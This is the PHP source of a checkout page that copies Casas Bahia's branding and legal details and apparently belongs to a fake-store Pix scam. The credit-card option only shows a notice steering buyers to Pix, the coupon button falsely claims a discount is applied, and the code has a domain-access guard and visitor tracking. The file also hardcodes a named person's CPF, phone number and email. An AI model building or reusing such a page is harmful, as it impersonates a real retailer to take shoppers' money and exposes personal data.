<?php
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/domain_guard.php';
checkDomainAccess();
require_once __DIR__ . '/includes/pixel_tracker.php';

$db = getDBConnection();
$id = $_GET['id'] ?? null;

// Carregar Produto por ID ou buscar o mais recente
$product = null;
if (!empty($id)) {
    $stmt = $db->prepare("SELECT * FROM products WHERE id = :id LIMIT 1");
    $stmt->execute(['id' => $id]);
    $product = $stmt->fetch();
}

if (!$product) {
    $stmt = $db->query("SELECT * FROM products ORDER BY id DESC LIMIT 1");
    $product = $stmt->fetch();
}

if (!$product) {
    $product = [
        'id' => 1,
        'title' => 'Smart TV 43 AOC Full HD Wi-Fi Roku TV',
        'brand' => 'AOC',
        'regular_price' => 1699.00,
        'pix_price' => 1580.07,
        'item_code' => '55071718'
    ];
}

// Carregar Imagem Principal
$stmtImg = $db->prepare("SELECT image_url FROM product_images WHERE product_id = :pid ORDER BY is_main DESC, id ASC LIMIT 1");
$stmtImg->execute(['pid' => $product['id']]);
$mainImage = $stmtImg->fetchColumn();
if (!$mainImage) {
    $mainImage = 'assets/images/product_aoc_main.png';
}

$formattedPixPrice = number_format($product['pix_price'], 2, ',', '.');
$formattedRegularPrice = number_format($product['regular_price'] ?? ($product['pix_price'] * 1.1), 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Pagamento | Casas Bahia</title>
  <link rel="icon" href="https://www.casasbahia.com.br/favicon.ico">
  <?php renderFacebookPixel('AddPaymentInfo', ['content_name' => $product['title'], 'content_ids' => [strval($product['id'])], 'content_type' => 'product', 'value' => (float)$product['pix_price'], 'currency' => 'BRL']); ?>
  <style>
    :root {
      --cb-blue: #003399;
      --cb-red: #e30613;
      --cb-green: #168019;
      --cb-bg: #f8f9fa;
      --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); }
    body { background-color: var(--cb-bg); color: #0f172a; padding-bottom: 60px; -webkit-font-smoothing: antialiased; }

    /* LINHA VERMELHA TOPO */
    .top-red-line { height: 4px; background-color: var(--cb-red); width: 100%; }

    /* HEADER */
    header { background: #ffffff; padding: 14px 16px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
    .brand-logo { font-size: 20px; font-weight: 900; color: var(--cb-blue); text-decoration: none; letter-spacing: -0.5px; }
    .brand-logo span { color: var(--cb-red); }
    .accessibility-icon { color: var(--cb-blue); display: flex; align-items: center; cursor: pointer; }

    /* CONTAINER PRINCIPAL */
    .checkout-container { max-width: 480px; margin: 0 auto; padding: 16px; }

    .main-page-title { font-size: 20px; font-weight: 700; color: var(--cb-blue); margin: 12px 0 16px 0; }

    /* CARD CUPONS DE DESCONTO (FOTO MEDIA_1787972680171.JPG) */
    .coupon-card { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 18px 20px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: border-color 0.2s; }
    .coupon-card:hover { border-color: var(--cb-blue); }
    .coupon-text-col { display: flex; flex-direction: column; gap: 4px; }
    .coupon-title { font-size: 16px; font-weight: 700; color: var(--cb-blue); }
    .coupon-sub { font-size: 14px; color: var(--cb-blue); opacity: 0.9; }
    .coupon-plus-icon { font-size: 24px; font-weight: 700; color: var(--cb-blue); line-height: 1; }

    .section-select-title { font-size: 18px; font-weight: 700; color: #0f172a; margin-bottom: 16px; }

    /* CARDS DE OPÇÃO DE PAGAMENTO IDÊNTICOS À FOTO */
    .payment-option-card { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 20px; margin-bottom: 16px; cursor: pointer; transition: all 0.2s ease; position: relative; }
    .payment-option-card:hover, .payment-option-card.active { border-color: var(--cb-blue); box-shadow: 0 4px 14px rgba(0, 51, 153, 0.08); }
    
    .card-top-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
    .card-title-left { display: flex; align-items: center; gap: 12px; }
    .card-title-text { font-size: 18px; font-weight: 700; color: var(--cb-blue); }
    
    .chevron-arrow { color: var(--cb-blue); transition: transform 0.2s ease; flex-shrink: 0; }
    .payment-option-card.active .chevron-arrow { transform: rotate(90deg); }

    .card-subtitle-gray { font-size: 14px; color: #64748b; margin-left: 36px; margin-bottom: 8px; }
    .card-subtitle-green { font-size: 14px; color: var(--cb-green); font-weight: 600; margin-left: 36px; margin-bottom: 8px; }

    .card-price-line { font-size: 15px; color: var(--cb-blue); margin-left: 36px; font-weight: 500; }
    .card-price-line strong { font-size: 18px; font-weight: 800; color: var(--cb-blue); }

    /* MODAL / PAINEL EXPANSÍVEL INTERNO DO CARTÃO OU PIX */
    .card-expand-panel { display: none; margin-top: 16px; padding-top: 16px; border-top: 1px solid #e2e8f0; }
    .payment-option-card.active .card-expand-panel { display: block; }

    .pix-expand-box { background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 16px; font-size: 14px; color: #334155; line-height: 1.45; }
    
    .btn-finish-pix {
      width: 100%;
      height: 50px;
      background-color: var(--cb-green);
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 800;
      cursor: pointer;
      margin-top: 14px;
      box-shadow: 0 4px 12px rgba(22, 128, 25, 0.25);
      text-transform: uppercase;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: background-color 0.2s;
    }
    .btn-finish-pix:active { background-color: #136915; }

    /* AVISO ELEGANTE NO CARTÃO DE CRÉDITO */
    .card-notice-box-elegant {
      background: linear-gradient(135deg, #f0f7ff 0%, #e6f0fa 100%);
      border: 1px solid #bbe1fa;
      border-radius: 10px;
      padding: 18px;
      box-shadow: 0 2px 8px rgba(0, 51, 153, 0.05);
    }
    .notice-badge-row { margin-bottom: 8px; }
    .notice-badge-pill {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      background: #003399;
      color: #ffffff;
      font-size: 11px;
      font-weight: 800;
      padding: 4px 10px;
      border-radius: 20px;
      letter-spacing: 0.5px;
    }
    .notice-headline {
      font-size: 15px;
      font-weight: 800;
      color: #003399;
      margin-bottom: 6px;
    }
    .notice-body-text {
      font-size: 13px;
      color: #334155;
      line-height: 1.5;
      margin-bottom: 14px;
    }
    .btn-switch-to-pix {
      width: 100%;
      height: 44px;
      background: #003399;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      transition: background-color 0.2s;
    }
    .btn-switch-to-pix:active {
      background-color: #002266;
    }

    /* SEÇÃO REVISÃO DE ENDEREÇO E RESUMO DO PEDIDO */
    .section-review-header { display: flex; align-items: center; justify-content: space-between; margin-top: 32px; margin-bottom: 16px; }
    .review-title-text { font-size: 18px; font-weight: 700; color: #0f172a; }
    .link-edit-address { font-size: 15px; font-weight: 600; color: var(--cb-blue); text-decoration: underline; cursor: pointer; }

    .address-review-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; margin-bottom: 28px; }
    .addr-line-bold { font-size: 15px; font-weight: 700; color: #1e293b; margin-bottom: 6px; }
    .addr-line-text { font-size: 14px; color: #475569; line-height: 1.45; margin-bottom: 2px; }
    .addr-recipient-row { font-size: 14px; color: #475569; margin-top: 14px; }
    .addr-recipient-row strong { color: #0f172a; font-weight: 800; }

    .summary-section-title { font-size: 20px; font-weight: 700; color: var(--cb-blue); margin-bottom: 16px; }
    
    .order-summary-box { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; padding: 16px; margin-bottom: 24px; }
    .order-item-flex { display: flex; align-items: flex-start; gap: 12px; padding-bottom: 14px; }
    .order-thumb-img { width: 72px; height: 72px; object-fit: contain; flex-shrink: 0; border-radius: 6px; }
    .order-item-info { flex: 1; min-width: 0; }
    .order-item-title { font-size: 14px; font-weight: 500; color: #1e293b; line-height: 1.35; margin-bottom: 4px; }
    .order-seller-text { font-size: 13px; color: #64748b; margin-bottom: 6px; }
    .order-seller-text strong { color: var(--cb-blue); font-weight: 700; }
    
    .order-delivery-date { font-size: 14px; font-weight: 700; color: #1e293b; margin-bottom: 4px; }
    .order-item-price-blue { font-size: 16px; font-weight: 800; color: var(--cb-blue); }
    .order-item-subtotal { font-size: 16px; font-weight: 800; color: var(--cb-blue); text-align: right; margin-top: 8px; margin-bottom: 12px; }

    .card-divider-line { height: 1px; background: #e2e8f0; width: 100%; margin: 12px 0; }

    .order-total-row { display: flex; align-items: center; justify-content: space-between; font-size: 16px; font-weight: 700; color: #0f172a; margin-top: 12px; margin-bottom: 12px; }
    .order-total-row strong { font-size: 16px; font-weight: 800; color: #0f172a; }

    .payment-notice-sub { text-align: center; font-size: 13px; color: #64748b; margin: 16px 0 20px 0; }

    /* RODAPÉ LEGAL CNPJ CASAS BAHIA */
    .legal-footer { margin-top: 36px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.65; font-weight: 400; }
  </style>
</head>
<body>

  <!-- TOPO LINHA VERMELHA -->
  <div class="top-red-line"></div>

  <!-- HEADER -->
  <header>
    <a href="carrinho.php?id=<?= $product['id'] ?>" class="brand-logo">CASAS<span>BAHIA</span></a>
    <div class="accessibility-icon" title="Acessibilidade">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <circle cx="12" cy="6.5" r="1.5" fill="#ffffff" stroke="none"/>
        <path d="M7 10.5h10M12 10.5v5M9.5 19.5l2.5-4 2.5 4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <div class="checkout-container">
    
    <!-- TÍTULO PAGAMENTO (FOTO MEDIA_1787972680171.JPG) -->
    <h1 class="main-page-title">Pagamento</h1>

    <!-- CARD CUPONS DE DESCONTO (FOTO MEDIA_1787972680171.JPG) -->
    <div class="coupon-card" onclick="handleCouponClick()">
      <div class="coupon-text-col">
        <span class="coupon-title">Cupons de desconto</span>
        <span class="coupon-sub">Resgate seu desconto</span>
      </div>
      <div class="coupon-plus-icon">+</div>
    </div>

    <!-- TÍTULO COMO VOCÊ DESEJA PAGAR? (FOTO MEDIA_1787972680171.JPG) -->
    <h2 class="section-select-title">Como você deseja pagar?</h2>

    <!-- 1º OPÇÃO: CARTÃO DE CRÉDITO (FOTO MEDIA_1787972680171.JPG) -->
    <div class="payment-option-card" id="optCard" onclick="selectPaymentOption('card')">
      <div class="card-top-header">
        <div class="card-title-left">
          <!-- ÍCONE CARTÃO DE CRÉDITO -->
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="2" y="5" width="20" height="14" rx="2"/>
            <line x1="2" y1="10" x2="22" y2="10"/>
          </svg>
          <span class="card-title-text">Cartão de crédito</span>
        </div>
        <svg class="chevron-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="9 18 15 12 9 6"/>
        </svg>
      </div>

      <div class="card-subtitle-gray">Pague à vista ou parcelado</div>
      <div class="card-price-line">
        a partir de <strong>R$ <?= $formattedPixPrice ?></strong>
      </div>

      <!-- PAINEL EXPANSÍVEL CARTÃO DE CRÉDITO COM DESIGN ELEGANTE -->
      <div class="card-expand-panel" id="panelCard">
        <div class="card-notice-box-elegant" onclick="event.stopPropagation()">
          <div class="notice-headline">Desconto Exclusivo no Pagamento via Pix</div>
          <div class="notice-body-text" style="margin-bottom: 0;">
            Esta condição promocional especial com desconto é aplicada exclusivamente para pagamentos à vista realizados via Pix. Selecione a opção Pix para garantir a aprovação imediata do seu pedido!
          </div>
        </div>
      </div>
    </div>

    <!-- 2º OPÇÃO: PIX (FOTO MEDIA_1787972680171.JPG) -->
    <div class="payment-option-card" id="optPix" onclick="selectPaymentOption('pix')">
      <div class="card-top-header">
        <div class="card-title-left">
          <!-- ÍCONE PIX OFICIAL -->
          <svg width="22" height="22" viewBox="0 0 24 24" fill="#003399">
            <path d="M12 2L4.5 9.5L12 17L19.5 9.5L12 2Z"/>
          </svg>
          <span class="card-title-text">Pix</span>
        </div>
        <svg class="chevron-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="9 18 15 12 9 6"/>
        </svg>
      </div>

      <div class="card-subtitle-green">Aprovação em instantes</div>
      <div class="card-price-line">
        <strong>R$ <?= $formattedPixPrice ?></strong> à vista
      </div>

      <!-- PAINEL EXPANSÍVEL PIX (FECHADO POR PADRÃO, ABRE APENAS AO CLICAR) -->
      <div class="card-expand-panel" id="panelPix" style="display: none;">
        <div class="pix-expand-box" onclick="event.stopPropagation()">
          <div style="margin-bottom: 12px; font-weight: 500;">O código Pix Copia e Cola será gerado na próxima tela para você realizar o pagamento através do aplicativo do seu banco. A confirmação do pedido é rápida assim que você concluir o Pix!</div>
          <button type="button" class="btn-finish-pix" id="btnFinishPix" onclick="processPixPayment()">
            Finalizar com Pix
          </button>
        </div>
      </div>
    </div>

    <!-- SEÇÃO REVISÃO DE ENDEREÇO (FOTO MEDIA_1787973329361.JPG E MEDIA_1787973336826.JPG) -->
    <div class="section-review-header">
      <h3 class="review-title-text">Revisão de endereço</h3>
      <a href="endereco.php?id=<?= $product['id'] ?>" class="link-edit-address">Editar endereço</a>
    </div>

    <div class="address-review-card">
      <div class="addr-line-bold" id="reviewStreetTitle">Geral</div>
      <div class="addr-line-text" id="reviewStreetNumber">GERAL, 43</div>
      <div class="addr-line-text" id="reviewNeighborhood">ambrosio,</div>
      <div class="addr-line-text" id="reviewCityState">Garopaba - SC</div>
      <div class="addr-line-text" id="reviewCep">88495-000</div>

      <div class="addr-recipient-row">
        Envio para: <strong id="reviewRecipient">[JONAS LIMA TEIXEIRA]</strong>
      </div>
    </div>

    <!-- SEÇÃO RESUMO DO PEDIDO (FOTO MEDIA_1787973329361.JPG E MEDIA_1787973336826.JPG) -->
    <h2 class="summary-section-title">Resumo do pedido</h2>

    <div class="order-summary-box">
      <div class="order-item-flex">
        <img src="<?= htmlspecialchars($mainImage) ?>" alt="<?= htmlspecialchars($product['title']) ?>" class="order-thumb-img">
        <div class="order-item-info">
          <div class="order-item-title">1x <?= htmlspecialchars($product['title']) ?></div>
          <div class="order-seller-text">Vendido e entregue por <strong>Casas Bahia</strong></div>
          <div class="order-delivery-date" id="deliveryDateText">até 28 de setembro, segunda:</div>
          <div class="order-item-price-blue">R$ <?= $formattedPixPrice ?></div>
        </div>
      </div>

      <div class="order-item-subtotal">R$ <?= $formattedPixPrice ?></div>

      <div class="card-divider-line"></div>

      <div class="order-total-row">
        <span>Entrega</span>
        <strong style="color: #168019;">Grátis</strong>
      </div>

      <div class="card-divider-line"></div>

      <div class="payment-notice-sub">
        Selecione o método de pagamento para visualizar o total
      </div>
    </div>

    <!-- RODAPÉ LEGAL CNPJ CASAS BAHIA -->
    <div class="legal-footer">
      Grupo Casas Bahia S.A. | www.casasbahia.com.br | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115
    </div>

  </div>

  <script>
    function getFormattedDeliveryDate() {
      var d = new Date();
      d.setDate(d.getDate() + 3);
      var days = ['domingo', 'segunda', 'terça', 'quarta', 'quinta', 'sexta', 'sábado'];
      var months = ['janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho', 'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro'];
      return 'até ' + d.getDate() + ' de ' + months[d.getMonth()] + ', ' + days[d.getDay()] + ':';
    }

    function loadSavedAddressReview() {
      var saved = localStorage.getItem('savedAddressData');
      if (saved) {
        try {
          var data = JSON.parse(saved);
          if (data) {
            var street = data.street || 'Endereço cadastrado';
            var number = data.number || 'S/N';
            var neighborhood = data.neighborhood || '';
            var city = data.city || '';
            var state = data.state || '';
            var cep = data.cep || '';
            var recipient = data.recipient || 'Jonas Lima Teixeira';

            document.getElementById('reviewStreetTitle').textContent = street;
            document.getElementById('reviewStreetNumber').textContent = street.toUpperCase() + ', ' + number;
            document.getElementById('reviewNeighborhood').textContent = neighborhood ? neighborhood + ',' : '';
            document.getElementById('reviewCityState').textContent = (city && state) ? (city + ' - ' + state) : (city || state);
            document.getElementById('reviewCep').textContent = cep;
            document.getElementById('reviewRecipient').textContent = '[' + recipient.toUpperCase() + ']';
          }
        } catch(e) {}
      }
    }

    document.addEventListener('DOMContentLoaded', function() {
      var dateElem = document.getElementById('deliveryDateText');
      if (dateElem) {
        dateElem.textContent = getFormattedDeliveryDate();
      }
      loadSavedAddressReview();
    });

    function handleCouponClick() {
      alert('Esta compra possui o melhor cupom de desconto promocional já aplicado automaticamente!');
    }

    function selectPaymentOption(option) {
      var optCard = document.getElementById('optCard');
      var optPix = document.getElementById('optPix');
      var panelCard = document.getElementById('panelCard');
      var panelPix = document.getElementById('panelPix');

      if (option === 'pix') {
        var isActive = optPix.classList.contains('active');
        if (isActive) {
          optPix.classList.remove('active');
          panelPix.style.display = 'none';
        } else {
          optPix.classList.add('active');
          optCard.classList.remove('active');
          panelPix.style.display = 'block';
          panelCard.style.display = 'none';
        }
      } else if (option === 'card') {
        var isActive = optCard.classList.contains('active');
        if (isActive) {
          optCard.classList.remove('active');
          panelCard.style.display = 'none';
        } else {
          optCard.classList.add('active');
          optPix.classList.remove('active');
          panelCard.style.display = 'block';
          panelPix.style.display = 'none';
        }
      }
    }

    async function processPixPayment() {
      var btn = document.getElementById('btnFinishPix');
      if (btn) {
        btn.disabled = true;
        btn.textContent = 'Gerando QR Code Pix...';
      }

      var clientName = 'Jonas Lima Teixeira';
      var clientCpf = '11800083912';
      var clientPhone = '47991447795';
      var clientEmail = 'mgsupabase@gmail.com';
      var shippingAddr = 'Endereço de entrega a combinar';

      var savedAddr = localStorage.getItem('savedAddressData');
      if (savedAddr) {
        try {
          var addrData = JSON.parse(savedAddr);
          if (addrData.recipient) clientName = addrData.recipient;
          if (addrData.cpf) clientCpf = addrData.cpf;
          if (addrData.phone) clientPhone = addrData.phone;
          if (addrData.email) clientEmail = addrData.email;
          if (addrData.street) shippingAddr = `${addrData.street}, ${addrData.number || 'S/N'} ${addrData.neighborhood ? '- ' + addrData.neighborhood : ''}, ${addrData.city || ''} - ${addrData.state || ''}, CEP: ${addrData.cep || ''}`;
        } catch(e) {}
      }

      var formData = new FormData();
      formData.append('product_id', "<?= $product['id'] ?>");
      formData.append('client_name', clientName);
      formData.append('client_cpf', clientCpf);
      formData.append('client_phone', clientPhone);
      formData.append('client_email', clientEmail);
      formData.append('shipping_address', shippingAddr);

      try {
        const res = await fetch('api/generate_pix.php', {
          method: 'POST',
          body: formData
        });
        const text = await res.text();
        let data;
        try {
          data = JSON.parse(text);
        } catch(pe) {
          console.error('Non-JSON response:', text);
          alert('Erro no processamento do Pix. Tente novamente.');
          if (btn) {
            btn.disabled = false;
            btn.textContent = 'Finalizar com Pix';
          }
          return;
        }

        if (data && data.status === 'success' && data.order_id) {
          if (clientCpf) {
            try {
              var session = {
                loggedIn: true,
                cpf: clientCpf,
                name: clientName,
                firstName: clientName.split(' ')[0]
              };
              localStorage.setItem('userSession', JSON.stringify(session));
            } catch(e) {}
          }
          try { localStorage.setItem('last_order_id', data.order_id); } catch(e) {}
          window.location.href = 'pix.php?order_id=' + data.order_id;
        } else {
          alert('Aviso ao gerar pagamento: ' + ((data && data.message) || 'Tente novamente.'));
          if (btn) {
            btn.disabled = false;
            btn.textContent = 'Finalizar com Pix';
          }
        }
      } catch(err) {
        console.error('Fetch error:', err);
        alert('Erro de conexão ao gerar o Pix. Verifique sua rede e tente novamente.');
        if (btn) {
          btn.disabled = false;
          btn.textContent = 'Finalizar com Pix';
        }
      }
    }

    function sendActivityPulse(pageName) {
      try { fetch('api/tracker.php?page=' + encodeURIComponent(pageName)); } catch (e) {}
    }
    sendActivityPulse('pagamento.php');
    setInterval(function() { sendActivityPulse('pagamento.php'); }, 8000);
  </script>
</body>
</html>
